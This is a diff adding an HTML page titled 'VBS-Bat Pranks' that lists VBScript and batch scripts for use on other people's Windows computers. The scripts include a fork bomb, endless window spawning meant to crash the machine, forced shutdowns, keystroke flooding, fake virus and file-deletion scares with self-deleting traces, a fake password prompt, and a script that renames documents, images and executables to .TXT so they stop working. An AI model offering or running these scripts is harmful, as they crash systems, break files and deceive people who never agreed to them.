@@ -1,0 +1,349 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="ie=edge" /> -->
+    <!-- bootstrap -->
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <!-- User's CSS -->
+    <link rel="stylesheet" href="css/styles.css">
+    <!-- FontAwesome 6.2.0 CSS -->
+    <script src="https://kit.fontawesome.com/6258d8aa81.js" crossorigin="anonymous"></script>
+
+    <title>VBS-Bat Pranks</title>
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/x-icon">
+
+</head>
+
+<body>
+    <section id="Navagation">
+        <nav class="navbar fixed-top navbar-expand-lg bg-dark navbar-dark">
+            <div class="container-fluid">
+                <a class="navbar-brand" href="#">
+                    <img src="images/Logo.png" alt="Logo-png" width=120px></a>
+                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarToggler"
+                    aria-controls="navbarToggler" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+                <div class="collapse navbar-collapse" id="navbarToggler">
+                    <div class="navbar-nav ms-auto">
+                        <a class="nav-link px-3 " href="index.html">Home</a>
+
+                        <a class="nav-link px-3 active" aria-current="page" href="pranks.html">Pranks</a>
+                        <a class="nav-link px-3" href="harmful.html">Harmful</a>
+                        <a class="nav-link px-3" href="other.html">Others</a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </section>
+    <div class="container mt-5">
+        <h1 class="text-center">PRANKS</h1>
+    </div>
+    <div class="container-fluid code">
+        <h5>Message box pop up</h5>
+        <h6>Make a message box that appear on the screen.</h6>
+        <p>do*<br>
+            MsgBox (" Type here the text that you want.") <br>
+            loop* <br>
+            *If you set 'do and loop', the message box appear again and again ... <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Convey a little mesage box and shutdown the computer</h5>
+        <p>
+            @echo off <br>
+            MsgBox ("I don't like you !!!") <br>
+            shutdown -c "Error! You are too ******!" -s <br>
+            Save it as Anything.bat <br>
+        </p>
+        <h5>Toggle the Caps Lock button cintinuously</h5>
+        <p>
+            Set wshShell =wscript.CreateObject("WScript.Shell") <br>
+            do <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys "{CAPSLOCK}" <br>
+            loop <br>
+            Save it as Anything.vbs <br>
+        </p>
+        <h5>Continoually Pop Out the CD drive</h5>
+        <p>
+            Set oWMP = CreateObject("WMPlayer.OCX.7") <br>
+            Set colCDROMs = oWMP.cdromCollection <br>
+            do <br>
+            if colCDROMs.Count >= 1 then <br>
+            For i = 0 to colCDROMs.Count - 1 <br>
+            colCDROMs.Item(i).Eject <br>
+            Next <br>
+            For i = 0 to colCDROMs.Count - 1 <br>
+            colCDROMs.Item(i).Eject <br>
+            Next <br>
+            End If <br>
+            wscript.sleep 5000 <br>
+            loop <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Hit Backspace/ ENTER/ CAPSLOCK/ NUMLOCK/ SCROLLLOCK continually</h5>
+        <p>
+            MsgBox ("Let's go back a few steps !!!") <br>
+            Set wshShell =wscript.CreateObject("WScript.Shell") <br>
+            do <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys "{bs}" <br>
+            'OR wshshell.sendkeys "{ENTER}"
+            'OR wshshell.sendkeys "{CAPSLOCK}"
+            'OR wshshell.sendkeys "{NUMLOCK}"
+            'OR wshshell.sendkeys "{SCROLLLOCK}"
+            loop <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Let the keyboard type "You are a fool." continuously</h5>
+        <p>
+            Set wshShell = wscript.CreateObject("WScript.Shell") <br>
+            do <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys "You are a fool." <br>
+            loop <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Start Notepad cintinuously</h5>
+        <p>
+            @echo off <br>
+            :top <br>
+            START %SystemRoot%\system32\notepad.exe <br>
+            GOTO top <br>
+            Save it as Anything.bat
+        </p>
+        <h5>Make a Disco on your keyboard</h5>
+        <p>
+            Set wshShell =wscript.CreateObject("WScript.Shell") <br>
+            do <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys "{CAPSLOCK}" <br>
+            wshshell.sendkeys "{NUMLOCK}" <br>
+            wshshell.sendkeys "{SCROLLLOCK}" <br>
+            loop <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Fork Bomber</h5>
+        <p>
+            @ECHO OFF <br>
+            :START <br>
+            START fork.bat <br>
+            GOTO START <br>
+            Save it as Anything.bat
+        </p>
+        <h5>Making "the virus"</h5>
+        <p>
+            Msgbox "Your computer has been infected by a virus",16,"Warning !" <br>
+            dim x,yes,no <br>
+            x=Msgbox("Virus has infected hard drive (C:). Deletion of the virus will require complete formatting of hard
+            drive (C:). Would you like to format hard drive (C:) ?",52,"Warning !") <br>
+            if x=6 then <br>
+            dim box <br>
+            box=Msgbox("Hard drive (C:) formatting complete. In order to function correctly your computer must restart,
+            would you like to restart now ?",36,"Formatting has been completed") <br>
+            if box=6 then <br>
+            Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" <br>
+            Msgbox "Just kidding, this was all a joke, but i did scare you didn't I ? Héhé...",64,"Made by GillesM95"
+            <br>
+            end if <br>
+            if box=7 then <br>
+            Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" <br>
+            Msgbox "Just kidding, this was all a joke, but i did scare you didn't I ? Héhé...",64,"Made by GillesM95"
+            <br>
+            end if <br>
+            end if <br>
+            if x=7 then <br>
+            Msgbox "Fatal error, code 08x48631643.B-7",16,"ERROR" <br>
+            Msgbox "Just kidding, this was all a joke, but i did scare you didn't I ? Héhé...",64,"Made by GillesM95"
+            <br>
+            end if <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Automate Typer</h5>
+        <p> Set wshshell = wscript.CreateObject(”WScript.Shell”) <br>
+            Wshshell.run “Notepad” <br>
+            wscript.sleep 400 <br>
+            wshshell.sendkeys “H” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “i” <br>
+            wscript.sleep 200 <br>
+            wshshell.sendkeys ” ” <br>
+            wscript.sleep 200 <br>
+            wshshell.sendkeys “I” <br>
+            wscript.sleep 200 <br>
+            wshshell.sendkeys ” ” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “a” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “m” <br>
+            wscript.sleep 200 <br>
+            wshshell.sendkeys ” ” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “a” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “V” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “B” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “S” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “” <br>
+            wscript.sleep 200 <br>
+            wshshell.sendkeys ”c” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “o” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “d” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “e” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “!” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “!” <br>
+            wscript.sleep 100 <br>
+            wshshell.sendkeys “!” <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Matrix effect</h5>
+        <p>
+            @echo off <br>
+            color 02 <br>
+            :start <br>
+            echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% <br>
+            goto start <br>
+            Save it as Anything.bat
+        </p>
+        <h5>Unclosable File</h5>
+        <p>
+            @echo off <br>
+            md hello <br>
+            :A <br>
+            start hello <br>
+            goto A <br>
+            Save it as Anything.bat
+        </p>
+        <h5>"Delete"</h5>
+        <h6>This prank will make your friends think that all of their files are being deleted and then at the end the
+            file deletes itself so it is untraceable.</h6>
+        <p>
+            @echo off <br>
+            echo do you want to delete all of your computer data? (y/n) <br>
+            pause >nul <br>
+            echo Do not exit out of the screen or all computer data will be deleted. <br>
+            ping localhost -n 2 > nul <br>
+            echo Are you sure you want to delete all computer data? (y/n) <br>
+            pause >nul <br>
+            echo deleting all data... <br>
+            echo. <br>
+            echo. <br>
+            pause localhost -n 2 > nul <br>
+            dir /s <br>
+            echo. <br>
+            echo. <br>
+            ping localhost -n 2 > nul <br>
+            cls <br>
+            echo error.. error.. Not all data deleted, are you sure you wish to stop? (y/n) <br>
+            pause <br>
+            echo. <br>
+            echo. <br>
+            ping localhost -n 1 > nul <br>
+            cls <br>
+            dir /s <br>
+            echo. <br>
+            echo. <br>
+            ping localhost -n 2 >nul <br>
+            cls <br>
+            echo all data has been deleted.. <br>
+            pause <br>
+            del "c:delete.bat" <br>
+            Save it as Delete.bat
+        </p>
+        <h5>Command prompts unlimited</h5>
+        <h6>This prank will open and unlimited amount of command prompts until the computer crashes or you manually
+            crash it.</h6>
+        <p>
+            start virus.bat <br>
+            Save it as virus.bat
+        </p>
+        <h5>Shutdown</h5>
+        <h6>This makes your friend think that his/her computer has a virus then their computer shuts down.</h6>
+        <p>
+            @echo off <br>
+            :A <br>
+            cls <br>
+            echo Do you wanna crash your computer? (y/n) <br>
+            pause <br>
+            echo Are you sure? (y/n) <br>
+            pause <br>
+            echo your computer will crash when the time reaches zero. <br>
+            pause <br>
+            msg * Your computer will crash in... <br>
+            msg * 5 <br>
+            msg * 4 <br>
+            msg * 3 <br>
+            msg * 2 <br>
+            msg * 1 <br>
+            msg * Good-Bye <br>
+            msg * You have been pwned! :) <br>
+            shutdown -s -t 00 <br>
+            Save it as Anything.vbs
+        </p>
+        <h5>Fake Area</h5>
+        <h6>Shows a fake username and password entrance area then deletes it self.</h6>
+        <p>
+            @echo off <br>
+            echo If the proper username and password is not entered all files will be deleted by this virus. <br>
+            echo Good Luck <br>
+            set/p\/name=username: <br>
+            set/p\/password=password: <br>
+            echo haha you got the username and password wrong <br>
+            pause <br>
+            echo Files are being deleted <br>
+            pause <br>
+            dir/s <br>
+            del "c:up.bat" <br>
+            Save it as up.bat
+        </p>
+        <h5>TXT Files</h5>
+        <h6>Change files to non-working TXT files</h6>
+        <p>
+            REN *.DOC *.TXT <br>
+            REN *.JPEG *.TXT <br>
+            REN *.LNK *.TXT <br>
+            REN *.AVI *.TXT <br>
+            REN *.MPEG *.TXT <br>
+            REN *.COM *.TXT <br>
+            REN *.BAT *.TXT <br>
+            save it as Anything.bat
+        </p>
+        <h5>Make 1 000 folders in a few seconds</h5>
+        <p>
+            @echo off <br>
+            :top <br>
+            md %random% <br>
+            goto top <br>
+            Save it as Anything.bat
+        </p>
+
+    </div>
+
+    <div class="cta content">
+        <a class="share-icon" href="https://github.com/muzammil-cyber"><i class="fa fa-github"></i></a>
+        <a class="share-icon" href="mailto:zinccc130@gmail.com"><i class="fa fa-envelope"></i></a>
+        <p>© 2023 Muzammil Loya</p>
+    </div>
+
+    <!-- Bootstrap script -->
+    <script src="js/bootstrap.bundle.min.js"></script>
+
+
+</body>
+
+</html>
